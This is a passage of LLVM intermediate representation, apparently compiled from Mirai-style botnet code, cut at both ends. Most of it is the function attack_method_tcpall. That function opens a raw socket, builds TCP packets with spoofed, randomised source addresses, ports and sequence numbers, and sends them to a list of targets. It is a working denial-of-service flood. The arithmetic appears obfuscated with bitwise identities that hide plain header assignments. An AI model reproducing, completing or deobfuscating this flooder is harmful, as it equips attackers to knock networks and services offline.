  br label %481

; <label>:653:                                    ; preds = %481
  br label %480

; <label>:654:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpall(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %633

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %633

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %459, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %466

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -43, -1
  %137 = or i8 %134, %135
  %138 = or i8 -43, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 -11, -1
  %145 = and i8 %142, -11
  %146 = and i8 %140, %144
  %147 = and i8 %143, -11
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 -11, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 -16, -1
  %162 = xor i8 %160, %161
  %163 = and i8 %162, %160
  %164 = and i8 %160, -16
  %165 = and i8 %163, 5
  %166 = xor i8 %163, 5
  %167 = or i8 %165, %166
  %168 = or i8 %163, 5
  store i8 %167, i8* %159, align 4
  %169 = load i8, i8* %12, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = call zeroext i16 @htons(i16 zeroext 60) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = load i16, i16* %13, align 2
  %176 = call zeroext i16 @htons(i16 zeroext %175) #7
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load i8, i8* %14, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 5
  store i8 %179, i8* %181, align 4
  %182 = load i8, i8* %15, align 1
  %183 = icmp ne i8 %182, 0
  br i1 %183, label %184, label %188

; <label>:184:                                    ; preds = %113
  %185 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 4
  store i16 %185, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %184, %113
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 6
  store i8 6, i8* %190, align 1
  %191 = load i32, i32* %26, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 8
  store i32 %191, i32* %193, align 4
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 9
  store i32 %199, i32* %201, align 4
  %202 = load i16, i16* %16, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  store i16 %203, i16* %205, align 4
  %206 = load i16, i16* %17, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 1
  store i16 %207, i16* %209, align 2
  %210 = load i32, i32* %18, align 4
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = zext i16 %212 to i32
  %214 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 2
  store i32 %213, i32* %215, align 4
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -241, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -241
  %223 = xor i16 %221, -1
  %224 = xor i16 160, -1
  %225 = xor i16 -7585, -1
  %226 = and i16 %223, -7585
  %227 = and i16 %221, %225
  %228 = and i16 %224, -7585
  %229 = and i16 160, %225
  %230 = or i16 %226, %227
  %231 = or i16 %228, %229
  %232 = xor i16 %230, %231
  %233 = or i16 %223, %224
  %234 = xor i16 %233, -1
  %235 = or i16 -7585, %225
  %236 = and i16 %234, %235
  %237 = or i16 %232, %236
  %238 = or i16 %221, 160
  store i16 %237, i16* %217, align 4
  %239 = load i8, i8* %20, align 1
  %240 = sext i8 %239 to i16
  %241 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = xor i16 1, -1
  %245 = xor i16 %240, %244
  %246 = and i16 %245, %240
  %247 = and i16 %240, 1
  %248 = shl i16 %246, 13
  %249 = xor i16 %243, -1
  %250 = xor i16 -8193, -1
  %251 = xor i16 -11729, -1
  %252 = or i16 %249, %250
  %253 = or i16 -11729, %251
  %254 = xor i16 %252, -1
  %255 = and i16 %254, %253
  %256 = and i16 %243, -8193
  %257 = xor i16 %255, -1
  %258 = xor i16 %248, -1
  %259 = xor i16 -8317, -1
  %260 = and i16 %257, -8317
  %261 = and i16 %255, %259
  %262 = and i16 %258, -8317
  %263 = and i16 %248, %259
  %264 = or i16 %260, %261
  %265 = or i16 %262, %263
  %266 = xor i16 %264, %265
  %267 = or i16 %257, %258
  %268 = xor i16 %267, -1
  %269 = or i16 -8317, %259
  %270 = and i16 %268, %269
  %271 = or i16 %266, %270
  %272 = or i16 %255, %248
  store i16 %271, i16* %242, align 4
  %273 = load i8, i8* %21, align 1
  %274 = sext i8 %273 to i16
  %275 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = xor i16 1, -1
  %279 = xor i16 %274, %278
  %280 = and i16 %279, %274
  %281 = and i16 %274, 1
  %282 = shl i16 %280, 12
  %283 = xor i16 -4097, -1
  %284 = xor i16 %277, %283
  %285 = and i16 %284, %277
  %286 = and i16 %277, -4097
  %287 = and i16 %285, %282
  %288 = xor i16 %285, %282
  %289 = or i16 %287, %288
  %290 = or i16 %285, %282
  store i16 %289, i16* %276, align 4
  %291 = load i8, i8* %22, align 1
  %292 = sext i8 %291 to i16
  %293 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = xor i16 %292, -1
  %297 = xor i16 1, -1
  %298 = xor i16 -12910, -1
  %299 = or i16 %296, %297
  %300 = or i16 -12910, %298
  %301 = xor i16 %299, -1
  %302 = and i16 %301, %300
  %303 = and i16 %292, 1
  %304 = shl i16 %302, 11
  %305 = xor i16 -2049, -1
  %306 = xor i16 %295, %305
  %307 = and i16 %306, %295
  %308 = and i16 %295, -2049
  %309 = xor i16 %307, -1
  %310 = xor i16 %304, -1
  %311 = xor i16 27884, -1
  %312 = and i16 %309, 27884
  %313 = and i16 %307, %311
  %314 = and i16 %310, 27884
  %315 = and i16 %304, %311
  %316 = or i16 %312, %313
  %317 = or i16 %314, %315
  %318 = xor i16 %316, %317
  %319 = or i16 %309, %310
  %320 = xor i16 %319, -1
  %321 = or i16 27884, %311
  %322 = and i16 %320, %321
  %323 = or i16 %318, %322
  %324 = or i16 %307, %304
  store i16 %323, i16* %294, align 4
  %325 = load i8, i8* %23, align 1
  %326 = sext i8 %325 to i16
  %327 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = xor i16 1, -1
  %331 = xor i16 %326, %330
  %332 = and i16 %331, %326
  %333 = and i16 %326, 1
  %334 = shl i16 %332, 10
  %335 = xor i16 %329, -1
  %336 = xor i16 -1025, -1
  %337 = xor i16 -10740, -1
  %338 = or i16 %335, %336
  %339 = or i16 -10740, %337
  %340 = xor i16 %338, -1
  %341 = and i16 %340, %339
  %342 = and i16 %329, -1025
  %343 = and i16 %341, %334
  %344 = xor i16 %341, %334
  %345 = or i16 %343, %344
  %346 = or i16 %341, %334
  store i16 %345, i16* %328, align 4
  %347 = load i8, i8* %24, align 1
  %348 = sext i8 %347 to i16
  %349 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %350 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %349, i32 0, i32 4
  %351 = load i16, i16* %350, align 4
  %352 = xor i16 %348, -1
  %353 = xor i16 1, -1
  %354 = xor i16 2762, -1
  %355 = or i16 %352, %353
  %356 = or i16 2762, %354
  %357 = xor i16 %355, -1
  %358 = and i16 %357, %356
  %359 = and i16 %348, 1
  %360 = shl i16 %358, 9
  %361 = xor i16 %351, -1
  %362 = xor i16 -513, -1
  %363 = xor i16 -22004, -1
  %364 = or i16 %361, %362
  %365 = or i16 -22004, %363
  %366 = xor i16 %364, -1
  %367 = and i16 %366, %365
  %368 = and i16 %351, -513
  %369 = xor i16 %367, -1
  %370 = xor i16 %360, -1
  %371 = xor i16 14894, -1
  %372 = and i16 %369, 14894
  %373 = and i16 %367, %371
  %374 = and i16 %370, 14894
  %375 = and i16 %360, %371
  %376 = or i16 %372, %373
  %377 = or i16 %374, %375
  %378 = xor i16 %376, %377
  %379 = or i16 %369, %370
  %380 = xor i16 %379, -1
  %381 = or i16 14894, %371
  %382 = and i16 %380, %381
  %383 = or i16 %378, %382
  %384 = or i16 %367, %360
  store i16 %383, i16* %350, align 4
  %385 = load i8, i8* %25, align 1
  %386 = sext i8 %385 to i16
  %387 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 4
  %389 = load i16, i16* %388, align 4
  %390 = xor i16 %386, -1
  %391 = xor i16 1, -1
  %392 = xor i16 -16979, -1
  %393 = or i16 %390, %391
  %394 = or i16 -16979, %392
  %395 = xor i16 %393, -1
  %396 = and i16 %395, %394
  %397 = and i16 %386, 1
  %398 = shl i16 %396, 8
  %399 = xor i16 %389, -1
  %400 = xor i16 -257, -1
  %401 = xor i16 6102, -1
  %402 = or i16 %399, %400
  %403 = or i16 6102, %401
  %404 = xor i16 %402, -1
  %405 = and i16 %404, %403
  %406 = and i16 %389, -257
  %407 = and i16 %405, %398
  %408 = xor i16 %405, %398
  %409 = or i16 %407, %408
  %410 = or i16 %405, %398
  store i16 %409, i16* %388, align 4
  %411 = load i8*, i8** %29, align 8
  %412 = getelementptr inbounds i8, i8* %411, i32 1
  store i8* %412, i8** %29, align 8
  store i8 2, i8* %411, align 1
  %413 = load i8*, i8** %29, align 8
  %414 = getelementptr inbounds i8, i8* %413, i32 1
  store i8* %414, i8** %29, align 8
  store i8 4, i8* %413, align 1
  %415 = call i32 @rand_next()
  %416 = xor i32 %415, -1
  %417 = xor i32 15, -1
  %418 = xor i32 -1795665557, -1
  %419 = or i32 %416, %417
  %420 = or i32 -1795665557, %418
  %421 = xor i32 %419, -1
  %422 = and i32 %421, %420
  %423 = and i32 %415, 15
  %424 = sub i32 1400, 2141785639
  %425 = add i32 %424, %422
  %426 = add i32 %425, 2141785639
  %427 = add i32 1400, %422
  %428 = trunc i32 %426 to i16
  %429 = call zeroext i16 @htons(i16 zeroext %428) #7
  %430 = load i8*, i8** %29, align 8
  %431 = bitcast i8* %430 to i16*
  store i16 %429, i16* %431, align 2
  %432 = load i8*, i8** %29, align 8
  %433 = getelementptr inbounds i8, i8* %432, i64 2
  store i8* %433, i8** %29, align 8
  %434 = load i8*, i8** %29, align 8
  %435 = getelementptr inbounds i8, i8* %434, i32 1
  store i8* %435, i8** %29, align 8
  store i8 4, i8* %434, align 1
  %436 = load i8*, i8** %29, align 8
  %437 = getelementptr inbounds i8, i8* %436, i32 1
  store i8* %437, i8** %29, align 8
  store i8 2, i8* %436, align 1
  %438 = load i8*, i8** %29, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %29, align 8
  store i8 8, i8* %438, align 1
  %440 = load i8*, i8** %29, align 8
  %441 = getelementptr inbounds i8, i8* %440, i32 1
  store i8* %441, i8** %29, align 8
  store i8 10, i8* %440, align 1
  %442 = call i32 @rand_next()
  %443 = load i8*, i8** %29, align 8
  %444 = bitcast i8* %443 to i32*
  store i32 %442, i32* %444, align 4
  %445 = load i8*, i8** %29, align 8
  %446 = getelementptr inbounds i8, i8* %445, i64 4
  store i8* %446, i8** %29, align 8
  %447 = load i8*, i8** %29, align 8
  %448 = bitcast i8* %447 to i32*
  store i32 0, i32* %448, align 4
  %449 = load i8*, i8** %29, align 8
  %450 = getelementptr inbounds i8, i8* %449, i64 4
  store i8* %450, i8** %29, align 8
  %451 = load i8*, i8** %29, align 8
  %452 = getelementptr inbounds i8, i8* %451, i32 1
  store i8* %452, i8** %29, align 8
  store i8 1, i8* %451, align 1
  %453 = load i8*, i8** %29, align 8
  %454 = getelementptr inbounds i8, i8* %453, i32 1
  store i8* %454, i8** %29, align 8
  store i8 3, i8* %453, align 1
  %455 = load i8*, i8** %29, align 8
  %456 = getelementptr inbounds i8, i8* %455, i32 1
  store i8* %456, i8** %29, align 8
  store i8 3, i8* %455, align 1
  %457 = load i8*, i8** %29, align 8
  %458 = getelementptr inbounds i8, i8* %457, i32 1
  store i8* %458, i8** %29, align 8
  store i8 6, i8* %457, align 1
  br label %459

; <label>:459:                                    ; preds = %188
  %460 = load i32, i32* %9, align 4
  %461 = sub i32 0, %460
  %462 = sub i32 0, 1
  %463 = add i32 %461, %462
  %464 = sub i32 0, %463
  %465 = add nsw i32 %460, 1
  store i32 %464, i32* %9, align 4
  br label %108

; <label>:466:                                    ; preds = %108
  br label %467

; <label>:467:                                    ; preds = %632, %466
  store i32 0, i32* %9, align 4
  br label %468

; <label>:468:                                    ; preds = %626, %467
  %469 = load i32, i32* %9, align 4
  %470 = load i8, i8* %5, align 1
  %471 = zext i8 %470 to i32
  %472 = icmp slt i32 %469, %471
  br i1 %472, label %473, label %632

; <label>:473:                                    ; preds = %468
  %474 = load i8**, i8*** %11, align 8
  %475 = load i32, i32* %9, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds i8*, i8** %474, i64 %476
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %30, align 8
  %479 = load i8*, i8** %30, align 8
  %480 = bitcast i8* %479 to %struct.iphdr*
  store %struct.iphdr* %480, %struct.iphdr** %31, align 8
  %481 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i64 1
  %483 = bitcast %struct.iphdr* %482 to %struct.tcphdr*
  store %struct.tcphdr* %483, %struct.tcphdr** %32, align 8
  %484 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %485 = load i32, i32* %9, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 2
  %489 = load i8, i8* %488, align 4
  %490 = zext i8 %489 to i32
  %491 = icmp slt i32 %490, 32
  br i1 %491, label %492, label %516

; <label>:492:                                    ; preds = %473
  %493 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %494 = load i32, i32* %9, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i64 %495
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i32 0, i32 1
  %498 = load i32, i32* %497, align 4
  %499 = call i32 @ntohl(i32 %498) #7
  %500 = call i32 @rand_next()
  %501 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %502 = load i32, i32* %9, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i64 %503
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %504, i32 0, i32 2
  %506 = load i8, i8* %505, align 4
  %507 = zext i8 %506 to i32
  %508 = lshr i32 %500, %507
  %509 = add i32 %499, 1494334836
  %510 = add i32 %509, %508
  %511 = sub i32 %510, 1494334836
  %512 = add i32 %499, %508
  %513 = call i32 @htonl(i32 %511) #7
  %514 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 9
  store i32 %513, i32* %515, align 4
  br label %516

; <label>:516:                                    ; preds = %492, %473
  %517 = load i32, i32* %26, align 4
  %518 = icmp eq i32 %517, -1
  br i1 %518, label %519, label %523

; <label>:519:                                    ; preds = %516
  %520 = call i32 @rand_next()
  %521 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 8
  store i32 %520, i32* %522, align 4
  br label %523

; <label>:523:                                    ; preds = %519, %516
  %524 = load i16, i16* %13, align 2
  %525 = zext i16 %524 to i32
  %526 = icmp eq i32 %525, 65535
  br i1 %526, label %527, label %536

; <label>:527:                                    ; preds = %523
  %528 = call i32 @rand_next()
  %529 = xor i32 65535, -1
  %530 = xor i32 %528, %529
  %531 = and i32 %530, %528
  %532 = and i32 %528, 65535
  %533 = trunc i32 %531 to i16
  %534 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 3
  store i16 %533, i16* %535, align 4
  br label %536

; <label>:536:                                    ; preds = %527, %523
  %537 = load i16, i16* %16, align 2
  %538 = zext i16 %537 to i32
  %539 = icmp eq i32 %538, 65535
  br i1 %539, label %540, label %549

; <label>:540:                                    ; preds = %536
  %541 = call i32 @rand_next()
  %542 = xor i32 65535, -1
  %543 = xor i32 %541, %542
  %544 = and i32 %543, %541
  %545 = and i32 %541, 65535
  %546 = trunc i32 %544 to i16
  %547 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %548 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %547, i32 0, i32 0
  store i16 %546, i16* %548, align 4
  br label %549

; <label>:549:                                    ; preds = %540, %536
  %550 = load i16, i16* %17, align 2
  %551 = zext i16 %550 to i32
  %552 = icmp eq i32 %551, 65535
  br i1 %552, label %553, label %562

; <label>:553:                                    ; preds = %549
  %554 = call i32 @rand_next()
  %555 = xor i32 65535, -1
  %556 = xor i32 %554, %555
  %557 = and i32 %556, %554
  %558 = and i32 %554, 65535
  %559 = trunc i32 %557 to i16
  %560 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 1
  store i16 %559, i16* %561, align 2
  br label %562

; <label>:562:                                    ; preds = %553, %549
  %563 = load i32, i32* %18, align 4
  %564 = icmp eq i32 %563, 65535
  br i1 %564, label %565, label %569

; <label>:565:                                    ; preds = %562
  %566 = call i32 @rand_next()
  %567 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %568 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %567, i32 0, i32 2
  store i32 %566, i32* %568, align 4
  br label %569

; <label>:569:                                    ; preds = %565, %562
  %570 = load i32, i32* %19, align 4
  %571 = icmp eq i32 %570, 65535
  br i1 %571, label %572, label %576

; <label>:572:                                    ; preds = %569
  %573 = call i32 @rand_next()
  %574 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %575 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %574, i32 0, i32 3
  store i32 %573, i32* %575, align 4
  br label %576

; <label>:576:                                    ; preds = %572, %569
  %577 = load i8, i8* %20, align 1
  %578 = icmp ne i8 %577, 0
  br i1 %578, label %579, label %588

; <label>:579:                                    ; preds = %576
  %580 = call i32 @rand_next()
  %581 = xor i32 65535, -1
  %582 = xor i32 %580, %581
  %583 = and i32 %582, %580
  %584 = and i32 %580, 65535
  %585 = trunc i32 %583 to i16
  %586 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 7
  store i16 %585, i16* %587, align 2
  br label %588

; <label>:588:                                    ; preds = %579, %576
  %589 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %590 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %589, i32 0, i32 7
  store i16 0, i16* %590, align 2
  %591 = load %struct.iphdr*, %struct.iphdr** %31, align 8
